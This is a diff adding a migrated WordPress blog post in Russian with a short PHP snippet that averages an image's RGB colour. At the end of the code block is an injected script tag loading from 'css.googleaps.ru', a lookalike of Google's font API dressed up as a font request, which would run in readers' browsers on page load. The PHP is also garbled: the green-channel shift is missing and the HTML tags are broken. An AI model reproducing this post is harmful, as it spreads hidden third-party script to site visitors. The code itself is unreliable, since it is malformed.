@@ -1,0 +1,39 @@
+---
+layout: post
+status: publish
+published: true
+title: Получаем основной цвет изображения
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 569
+wordpress_url: http://devdocs.ru/?p=24
+date: '2014-08-19 22:37:41 +0300'
+date_gmt: '2014-08-19 22:37:41 +0300'
+categories:
+- PHP
+tags:
+- php
+- colors
+comments: []
+---
+<pre class="brush: php; gutter: true">    $i = imagecreatefromjpeg(&laquo;image.jpg&raquo;);</p>
+<p>    for ($x=0;$x<imagesx($i);$x++) {<br />
+    for ($y=0;$y<imagesy($i);$y++) {<br />
+    $rgb = imagecolorat($i,$x,$y);<br />
+    $r = ($rgb >> 16) &amp; 0xFF;<br />
+    $g = ($rgb >> &amp; 0xFF;<br />
+    $b = $rgb &amp; 0xFF;</p>
+<p>    $rTotal += $r;<br />
+    $gTotal += $g;<br />
+    $bTotal += $b;<br />
+    $total++;<br />
+    }<br />
+    }</p>
+<p>    $rAverage = round($rTotal&#47;$total);<br />
+    $gAverage = round($gTotal&#47;$total);<br />
+    $bAverage = round($bTotal&#47;$total);<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
